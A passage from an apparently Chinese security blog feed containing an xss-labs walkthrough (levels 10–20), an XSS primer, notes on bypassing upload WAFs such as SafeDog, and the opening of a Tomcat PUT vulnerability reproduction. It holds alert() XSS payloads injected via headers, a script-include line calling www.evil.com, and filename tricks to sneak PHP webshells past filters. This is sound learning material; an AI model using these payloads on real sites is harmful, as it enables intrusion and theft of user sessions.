alt="image-20220223234439823"></p><p>只是接收的参数值改变了。</p><p>但这里有三个<code>&lt;input&gt;标</code>签的话，也就意味着是三个参数。</p><p>试试修改<code>type</code>类型试试。</p><h3 id="0x03-7"><a href="#0x03-7" class="headerlink" title="0x03"></a>0x03</h3><p>这里随便将三个hidden字段中的其中一个改为text即可，都可出现输入框：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223234641082.png" alt="image-20220223234641082"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223234705362.png" alt="image-20220223234705362"></p><h3 id="0x04-3"><a href="#0x04-3" class="headerlink" title="0x04"></a>0x04</h3><p>由于没有提交表单的按钮，这里只能通过构造标签事件来进行触发JS代码：</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">type&#x3D;&quot;text&quot; onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223235457699.png" alt="image-20220223235457699"></p><p>点击输入框：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223235449192.png" alt="image-20220223235449192"></p><h3 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h3><p>分析下后端代码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223235651965.png" alt="image-20220223235651965"></p><p>可以看到是第三个字段<code>t_sort</code>接收参数值，之后将<code>&lt;</code>和<code>&gt;</code>替换为<code>空</code>，然后在<code>value</code>字段处接收处理过后的参数值输出。</p><h2 id="Level-11（Referer）"><a href="#Level-11（Referer）" class="headerlink" title="Level-11（Referer）"></a>Level-11（Referer）</h2><h3 id="0x00-8"><a href="#0x00-8" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224105752344.png" alt="image-20220224105752344"></p><h3 id="0x01-10"><a href="#0x01-10" class="headerlink" title="0x01"></a>0x01</h3><p>查看源码：<br><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224105817042.png" alt="image-20220224105817042"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224105844674.png" alt="image-20220224105844674"></p><p>同样，和第10关大致相同，但这里出现了请求来源的函数；</p><p><code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>：链接到当前页面的前一页面的 URL 地址。</p><p>这里应该是通过修改请求来源达到插入xss语句。</p><h3 id="0x02-10"><a href="#0x02-10" class="headerlink" title="0x02"></a>0x02</h3><p>使用第10关的方式同样也过关了，但这关的本意应该不是在这里。</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224110352001.png" alt="image-20220224110352001"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224110339373.png" alt="image-20220224110339373"></p><h3 id="0x03-8"><a href="#0x03-8" class="headerlink" title="0x03"></a>0x03</h3><p>抓个包，修改请求来源进行插入xss语句：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224110844783.png" alt="image-20220224110844783"></p><h3 id="0x04-4"><a href="#0x04-4" class="headerlink" title="0x04"></a>0x04</h3><p>value接收到参数值后将<code>&lt;</code>和<code>&gt;</code>进行了替换为<code>空</code>：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224111147386.png" alt="image-20220224111147386"></p><h3 id="0x05-2"><a href="#0x05-2" class="headerlink" title="0x05"></a>0x05</h3><p>构造事件标签进行绕过：</p><pre class="line-numbers language-none"><code class="language-none">Referer: &quot;onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot; type&#x3D;&quot;text&quot;&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224112434015.png" alt="image-20220224112434015"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224112219377.png" alt="image-20220224112219377"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224112202515.png" alt="image-20220224112202515"></p><h2 id="Level-12（User-agent）"><a href="#Level-12（User-agent）" class="headerlink" title="Level-12（User-agent）"></a>Level-12（User-agent）</h2><h3 id="0x00-9"><a href="#0x00-9" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224112551614.png" alt="image-20220224112551614"></p><h3 id="0x01-11"><a href="#0x01-11" class="headerlink" title="0x01"></a>0x01</h3><p>源代码这里可以看到有<code>User-Agent</code>字段，后端代码应该有获取这个字段的函数。</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224112539875.png" alt="image-20220224112539875"></p><p>那这里的思路和第11关差不多。</p><h3 id="0x02-11"><a href="#0x02-11" class="headerlink" title="0x02"></a>0x02</h3><p>抓包修改<code>User-Agent</code>的值：</p><pre class="line-numbers language-none"><code class="language-none">User-Agent: &quot;onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot; type&#x3D;&quot;text&quot;&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224114037609.png" alt="image-20220224114037609"></p><h3 id="0x03-9"><a href="#0x03-9" class="headerlink" title="0x03"></a>0x03</h3><p>点击输入框：<br><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224114105012.png" alt="image-20220224114105012"></p><h2 id="Level-13（Cookie）"><a href="#Level-13（Cookie）" class="headerlink" title="Level-13（Cookie）"></a>Level-13（Cookie）</h2><h3 id="0x00-10"><a href="#0x00-10" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224114218153.png" alt="image-20220224114218153"></p><p>###0x01</p><p>查看源码：<br><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224114205898.png" alt="image-20220224114205898"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224114305388.png" alt="image-20220224114305388"></p><p>后端源码中获取的是<code>cookie</code>值，在<code>t_cook</code>处进行输出；原理和前两关一样。</p><h3 id="0x02-12"><a href="#0x02-12" class="headerlink" title="0x02"></a>0x02</h3><p>抓包修改<code>cookie</code>值：</p><pre class="line-numbers language-none"><code class="language-none">Cookie: user&#x3D;&quot;onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot; type&#x3D;&quot;text&quot;&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224114826582.png" alt="image-20220224114826582"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224114855684.png" alt="image-20220224114855684"></p><h3 id="0x03-10"><a href="#0x03-10" class="headerlink" title="0x03"></a>0x03</h3><p>点击输入框：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220224114918848.png" alt="image-20220224114918848"></p><h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level-14"></a>Level-14</h2><h3 id="0x00-11"><a href="#0x00-11" class="headerlink" title="0x00"></a>0x00</h3><p>本关因iframe调用的文件地址失效，无法进行测试。要考的应该是通过修改iframe调用的文件来实现xss注入。</p><h2 id="Level-15（ng-include）"><a href="#Level-15（ng-include）" class="headerlink" title="Level-15（ng-include）"></a>Level-15（ng-include）</h2><h3 id="0x00-12"><a href="#0x00-12" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226180941907.png" alt="image-20220226180941907"></p><h3 id="0x01-12"><a href="#0x01-12" class="headerlink" title="0x01"></a>0x01</h3><p>查看下源码，发现有JS文件和一个<code>ng-include:</code>字符串：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226181109598.png" alt="image-20220226181109598"></p><p>后端源码中参数是通过get方式获取src进行传递：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226181403441.png" alt="image-20220226181403441"></p><pre class="line-numbers language-none"><code class="language-none">AngularJS： 是一个 **JavaScript 框架**。它可通过 &#96;&lt;script&gt;&#96; 标签添加到 HTML 页面。AngularJS指令 是以 **ng** 作为前缀的 HTML 属性。AngularJS ng-include 指令：用于包含外部的 HTML 文件；包含的内容将作为指定元素的子节点；ng-include属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。值得注意的是：    ng-include,如果单纯指定地址，必须要加引号    ng-include,加载外部html，script标签中的内容不执行    ng-include,加载外部html中含有style标签样式可以识别<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体用法参考：</p><p><a href="https://www.runoob.com/angularjs/angularjs-reference.html">https://www.runoob.com/angularjs/angularjs-reference.html</a></p><p>通俗点来说：<code>ng-include</code>其作用相当于php的include函数。那这关的思路就是通过传入包含xss漏洞的文件进行触发xss。</p><h3 id="0x02-13"><a href="#0x02-13" class="headerlink" title="0x02"></a>0x02</h3><p>那这里利用这两点： </p><p>1、ng-include,如果单纯指定地址，必须要加引号</p><p>2、包含外部的 HTML 文件</p><p>进行攻击；既然可以包含外部的html文件，将前面几关的其中一个文件包含进来进行触发xss漏洞。</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">&#39;level1.php?name&#x3D;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226183606798.png" alt="image-20220226183606798"></p><h3 id="0x03-11"><a href="#0x03-11" class="headerlink" title="0x03"></a>0x03</h3><p>点击<code>payload的长度:34</code>：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226183712065.png" alt="image-20220226183712065"></p><h2 id="Level-16（空格实体转义）"><a href="#Level-16（空格实体转义）" class="headerlink" title="Level-16（空格实体转义）"></a>Level-16（空格实体转义）</h2><h3 id="0x00-13"><a href="#0x00-13" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226183853226.png" alt="image-20220226183853226"></p><h3 id="0x01-13"><a href="#0x01-13" class="headerlink" title="0x01"></a>0x01</h3><p>先修改下参数值看看，参数值改变：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226183919093.png" alt="image-20220226183919093"></p><h3 id="0x02-14"><a href="#0x02-14" class="headerlink" title="0x02"></a>0x02</h3><p>看下源码：<br><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226184025078.png" alt="image-20220226184025078"></p><p>可以看到将<code>script，/，空格</code>进行了过滤，其中空格进行了两次过滤。</p><h3 id="0x03-12"><a href="#0x03-12" class="headerlink" title="0x03"></a>0x03</h3><p>使用事件型注入+替换空格进行尝试：</p><pre class="line-numbers language-none"><code class="language-none">&lt;img%0Asrc&#x3D;?%0Aonerror&#x3D;alert(&#39;xss&#39;)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于在html里，回车（%0A）是可以代替空格的</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226185747219.png" alt="image-20220226185747219"></p><h3 id="0x04-5"><a href="#0x04-5" class="headerlink" title="0x04"></a>0x04</h3><p>为什么不使用这个payload：</p><pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;onclick&#x3D;&quot;alert(1)&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Level-17（参数拼接）"><a href="#Level-17（参数拼接）" class="headerlink" title="Level-17（参数拼接）"></a>Level-17（参数拼接）</h1><h3 id="0x00-14"><a href="#0x00-14" class="headerlink" title="0x00"></a>0x00</h3><p>可以看到地址栏参数有些略微不同，应该是由arg01和arg02这两个字段传参：</p><p>（这里由于不支持swf文件格式，文件无法显示）</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226192406157.png" alt="image-20220226192406157"></p><h3 id="0x01-14"><a href="#0x01-14" class="headerlink" title="0x01"></a>0x01</h3><p>先随便传个参试试：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226191816389.png" alt="image-20220226191816389"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226191749683.png" alt="image-20220226191749683"></p><p>源代码中接收参数的src发生了变化，这里<code>xsf01.swf</code>需要值得注意。</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226192720196.png" alt="image-20220226192720196"></p><p><strong>swf</strong>：swf文件通常也被称为Flash文件。SWF格式文件广泛用于创建吸引人的应用程序，它们包含丰富的视频、声音、图形和动画。</p><h3 id="0x02-15"><a href="#0x02-15" class="headerlink" title="0x02"></a>0x02</h3><p>这里根据源码使用<code>事件型</code>进行注入：</p><pre class="line-numbers language-none"><code class="language-none">onclick&#x3D;&quot;alert(&#39;xss&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226193655774.png" alt="image-20220226193655774"></p><p>源码中成功插入xss语句，由于插件原因，不能够进行点击执行。</p><h2 id="Level-18（参数拼接）"><a href="#Level-18（参数拼接）" class="headerlink" title="Level-18（参数拼接）"></a>Level-18（参数拼接）</h2><h3 id="0x00-15"><a href="#0x00-15" class="headerlink" title="0x00"></a>0x00</h3><p>与第17关一样，环境有问题，思路也一样。</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226195342043.png" alt="image-20220226195342043"></p><h3 id="0x01-15"><a href="#0x01-15" class="headerlink" title="0x01"></a>0x01</h3><p>patload：</p><pre class="line-numbers language-none"><code class="language-none">onmouse&#x3D;alert(&#x2F;xss&#x2F;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226195545905.png" alt="image-20220226195545905"></p><h2 id="Level-19-20（Flash-XSS）"><a href="#Level-19-20（Flash-XSS）" class="headerlink" title="Level-19-20（Flash XSS）"></a>Level-19-20（Flash XSS）</h2><h3 id="0x00-16"><a href="#0x00-16" class="headerlink" title="0x00"></a>0x00</h3><p>基于Flash的xss漏洞。</p><p>19关查看源码得知这里src的值使用双引号进行了包含</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226195807293.png" alt="image-20220226195807293"></p><h3 id="0x01-16"><a href="#0x01-16" class="headerlink" title="0x01"></a>0x01</h3><p>后端代码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220226200202047.png" alt="image-20220226200202047"></p><p>一般思路有双引号肯定要进行闭合，最后触发js代码，但这里有<code>htmlspecialchars()</code>函数进行过滤，显然闭合是行不通的。</p><p>flash xss先告一段落，有时间再深入研究。</p><h3 id="Flash产生的xss问题主要有两种方式："><a href="#Flash产生的xss问题主要有两种方式：" class="headerlink" title="Flash产生的xss问题主要有两种方式："></a>Flash产生的xss问题主要有两种方式：</h3><p>1、加载第三方资源</p><p>2、与javascript通信引发XSS。</p><p>常见的可触发xss的危险函数有：</p><p><code>getURL</code> <code>navigateToURL</code> <code>ExternalInterface.call</code> <code>htmlText loadMovie</code>等</p><p>要想知道这一关的是不是属于flash xss，只需要对引用的swf文件</p><p>进行反编译然后进行源码分析。</p><p>这里我说使用的对此类文件进行反编译的工具是<code>jpexs-decompiler</code>。</p><p>项目地址:<a href="https://github.com/jindrapetrik/jpexs-decompiler">https://github.com/jindrapetrik/jpexs-decompiler</a></p><p>Flash XSS参考文章：<a href="https://baynk.blog.csdn.net/article/details/103213877">https://baynk.blog.csdn.net/article/details/103213877</a></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS基础</title>
      <link href="/2022/02/20/XSS%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/20/XSS%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XSS跨站脚本攻击：<br><img src="/2022/02/20/XSS%E5%9F%BA%E7%A1%80/image-20220220215531776.png" alt="image-20220220215531776"></p><h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h2><p>恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。属于前端漏洞。</p><p>（若有与对方交互的地方，就可能会有攻击点）</p><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><p>1、反射型（非持久型）：通过在页面上植入恶意链接，诱使用户点击，执行js脚本，所谓反射型XSS就是将用户输入的数据（恶意用户输入的js脚本），“反射”到浏览器执行。</p><p>2、存储型（持久型）：此类XSS漏洞是指，用户输入的数据（恶意代码）可以“存储”在服务端，只要有人访问这个包含有存储型XSS代码的页面，XSS脚本就会在他们的浏览器中执行，这种XSS具有很强的稳定性。所以也被称做，“持久型XSS”。</p><p>3、DOM型：它和前两种的区别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p><p>DOM型常见输入点：<br>document.location（以及location的多个属性）</p><p>document.referrer</p><p>document.cookie</p><p><strong>Document 对象</strong>：每个载入浏览器的 HTML 文档都会成为 Document 对象。</p><p>Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。</p><h2 id="XSS-“跨站脚本”重要的是脚本"><a href="#XSS-“跨站脚本”重要的是脚本" class="headerlink" title="XSS-“跨站脚本”重要的是脚本"></a>XSS-“跨站脚本”重要的是脚本</h2><p>跨站脚本的重点不在“跨站”上，而应该在“脚本”上。“跨”是属于浏览器的特性，而不是缺陷，造成“跨”这样的假象是因为绝大多数XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源，由于任何安全问题都存在“输入”的概念，很多时候输入的内容是有限制的。真正的XSS攻击弹出窗毫无意义，所以攻击代码可能会比较长，一般会注入类似下面的代码来引用第三方域上的脚本资源：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://www.evil.com/xss.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样的好处就是：代码容易控制。对于上面的例子，虽然<code>xss.js</code>的文件资源在<code>www.evil.com</code>上，但脚本内容却属于嵌入对象所在的浏览器上下文环境中。换句话说：人在你那里，但是心在我这里，战场就在我这里。既然战场在我这里，怎么玩那就是脚本的事了，脚本中实现任何想要的功能。比如：盗取用户身份认证信息，篡改用户数据等。</p><h2 id="XSS常规攻击手法"><a href="#XSS常规攻击手法" class="headerlink" title="XSS常规攻击手法"></a>XSS常规攻击手法</h2><p>1、盗用cookie，获取敏感信息。</p><p>2、利用植入Flash，通过crossdomain权限设置进一步获取更高权限;或者利用Java等得到类似的操作。</p><p>3、利用iframe、frame、或上述Flash等方式，以用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</p><p>4、利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</p><p>5、在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDos攻击的效果。</p><p>例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>“hey<span class="token operator">!</span>you are attacked”<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="XSS常用场景"><a href="#XSS常用场景" class="headerlink" title="XSS常用场景"></a>XSS常用场景</h2><p>由于XSS漏洞只有通过触发脚本语句才会执行，并且XSS漏洞的限制很多，代码触发不了XSS漏洞也就利用不了。而运用最多的地方，<strong>例如：留言板，订单页面等等</strong>，管理员经常查看的页面才有很大的成功率会触发XSS漏洞。这也表示XSS漏洞的限制很大。</p><h2 id="用户凭据"><a href="#用户凭据" class="headerlink" title="用户凭据"></a>用户凭据</h2><p>用户凭据：通过凭据可以判断对方身份信息</p><p>cookie：存储在本地，存活时间长，小中型网站</p><p>session：会话，存储在服务器，存活时间较短，大型网站</p><p><strong>webshell工具</strong></p><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传-WAF绕过</title>
      <link href="/2022/02/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-WAF%E7%BB%95%E8%BF%87/"/>
      <url>/2022/02/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-WAF%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于在真实环境当中，网站会有相应的软件防护，通常发现文件上传漏洞后还要进行WAF绕过，而类似的防护软件有safedog，BT等，所以需要了解防护的规则并且绕过防护。</p><p>当然，这里的WAF绕过是广义上的，不单单是指防护软件，类似前后端源码的防护规则也需要进行WAF绕过。</p><h2 id="上传参数名解析"><a href="#上传参数名解析" class="headerlink" title="上传参数名解析"></a>上传参数名解析</h2><p>Content-Disposition：一般可更改 </p><p>name：表单参数值，不能更改（一般右键源码可以看到）</p><p>filename：文件名，可以更改 </p><p>Content-Type：文件 MIME，视情况更改</p><h2 id="常见绕过方法"><a href="#常见绕过方法" class="headerlink" title="常见绕过方法"></a>常见绕过方法</h2><p>1、数据溢出-防匹配：</p><p><strong>原理：</strong>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p><p><strong>注：</strong>要在<code>form-data;</code>和<code>neme=&quot;upload_file&quot;</code>;字段中间添加大量垃圾数据，垃圾数据最后一定要添加<code>;</code>，为了让检测时候误认为是数据包的字段；或者添加在<code>name</code>和<code>filename</code>字段中间也可以。</p><p>2、符号变异-防匹配（<code>&#39;</code> <code>&quot;</code> <code>;</code>）：</p><p><strong>原理：</strong>安全狗只匹配<code>&#39;</code>，<code>&quot;</code>之间的内容，就是单写一个<code>&#39;</code>或<code>&quot;</code>会绕过安全狗的检测，取最后一个<code>&#39;</code>或<code>&quot;</code>之前的内容安全狗才提取。大多都是多多测试，然后过狗；而<code>;</code>在语言当中是语句的结束，所以也可以绕过。</p><p>3、数据截断-防匹配(%00 ; 换行) ：</p><p>（%00截断在安全狗4.0不能绕过，旧版可以）</p><p>文件后缀回车绕过：若上传x.php文件，抓包进行后缀名会后，</p><p>安全狗检测时的原型是：x.p\nh\np，则实现绕过。</p><p>4、重复数据-防匹配(参数多次)：</p><p>重复<code>filename=&quot;&quot;;</code>字段等。</p><p>5、Fuzz大法</p><p>参考文章：</p><p><a href="http://www.cl4y.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0bypass%E5%AE%89%E5%85%A8%E7%8B%974-0/">http://www.cl4y.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0bypass%E5%AE%89%E5%85%A8%E7%8B%974-0/</a></p><p>Payload：</p><pre class="line-numbers language-none"><code class="language-none">filename&#x3D;&quot;Content-Type: image&#x2F;jpeg;x.php&quot;;filename&#x3D;&quot;Content-Disposition: from-data; name&#x3D;&quot;upload_file&quot;x.php&quot;;filename&#x3D;&quot;xxx&#x2F;x.jpg&quot;filename&#x3D;&quot;x.php&quot;总之，各种绕过安全狗的姿势需要多尝试，由于安全狗版本问题，可能有些payload已经被拦截。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> Bypass WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传-解析漏洞</title>
      <link href="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于中间件会出现解析漏洞，若配合文件上传会出现很大的安全危害。这里以Vulhub靶场进行漏洞复现，在这之前要了解一下中间件，服务器和Web服务器的区别。</p><h2 id="中间件，服务器和Web服务器的区别"><a href="#中间件，服务器和Web服务器的区别" class="headerlink" title="中间件，服务器和Web服务器的区别"></a>中间件，服务器和Web服务器的区别</h2><p><strong>一、服务器的定义：</strong></p><p>服务器指的是一个<strong>管理资源并为用户提供服务的计算机软件</strong>，通常分为文件服务器、数据库服务器和应用程序服务器。运行以上软件的计算机或计算机系统也被称为服务器。</p><p><strong>二、中间件</strong></p><p>中间件是服务器上负责解析http请求的一组应用程序，负责接收并解析http请求数据包，在服务器上找到数据包所请求的文件后，将其返回给客户端，如果http数据包所请求的是一个动态脚本文件，如php等，中间件就要靠CGI与脚本语言解析软件进行交互，处理好动态脚本文件后，再将处理后的文件其返回给浏览器。</p><p>说白了，中间件就是服务器上web端口（通常为80端口）的一个翻译官，负责告诉服务器用户要请求哪些文件，如果用户请求的是一个静态的html页面，就直接在服务器上找到对应文件并将其交给用户浏览器，如果用户请求的是一个动态页面如php，asp等，中间件在找到该文件后，将其交给对应的脚本语言解析程序，脚本语言解析程序将文件解析成html后，再把解析过的文件发送给浏览器。</p><p>所以，浏览器本身并不能渲染解析动态脚本文件，以php为例，浏览器解析的.php文件，实际上是经服务器php程序解析后的html文件。</p><p>再者，如果服务器上没有安装中间件，那么服务器就不能理解用户发来的http数据包是什么意思，当然也就无法对http请求包进行正确的响应。</p><p><strong>三、Web服务器</strong></p><p>web服务器就是安装了中间件的服务器，如装了Nginx、Apache服务等。</p><p>原文链接：</p><p><a href="https://www.cnblogs.com/greycdoer0/p/10484309.html">https://www.cnblogs.com/greycdoer0/p/10484309.html</a></p><h2 id="Tomcat-PUT方法任意写文件漏洞复现"><a href="#Tomcat-PUT方法任意写文件漏洞复现" class="headerlink" title="Tomcat PUT方法任意写文件漏洞复现"></a>Tomcat PUT方法任意写文件漏洞复现</h2><h3 id="0x00-漏洞原理"><a href="#0x00-漏洞原理" class="headerlink" title="0x00 漏洞原理"></a>0x00 漏洞原理</h3><p>在 Windows 服务器下，Tomcat配置文件&#x2F;conf&#x2F;web.xml中，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。</p><h3 id="0x01-漏洞环境"><a href="#0x01-漏洞环境" class="headerlink" title="0x01 漏洞环境"></a>0x01 漏洞环境</h3><p>vulhub&#x2F;tomcat&#x2F;CVE-2017-12615</p><p>使用docker-compose build启动漏洞环境：</p><p><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220217222258093.png" alt="image-20220217222258093"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>首先访问一个不存在的文件1.jsp，可以看到404页面：</p><p><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220217224530062.png" 